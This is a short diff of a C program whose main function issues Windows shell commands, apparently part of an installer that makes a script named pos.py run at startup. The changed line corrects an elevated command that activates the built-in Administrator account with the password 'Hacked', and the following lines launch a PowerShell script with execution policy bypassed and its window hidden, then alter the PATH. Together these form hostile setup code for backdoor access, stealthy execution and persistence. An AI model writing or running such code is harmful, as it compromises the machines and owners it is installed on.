@@ -12,7 +12,7 @@ and triggering add_startup.py so that pos.py runs on startup.
 
 int main()
 {
-    system("start /WAIT powershell Start-Process cmd -Verb \"runas\" -command \"net user Administrator Hacked /active:yes\"");
+    system("start /WAIT powershell Start-Process cmd -Verb runas -ArgumentList '/c net user Administrator Hacked /active:yes'");
     system("start /WAIT powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file \"Initialize_v1.ps1\""); //powershell script that checks if python is installed
     system("setx path \"%PATH%;C:\\Python38\\\"");
     system("setx path \"%PATH%;C:\\Python38\\Scripts\\\""); //adds the right path for pip
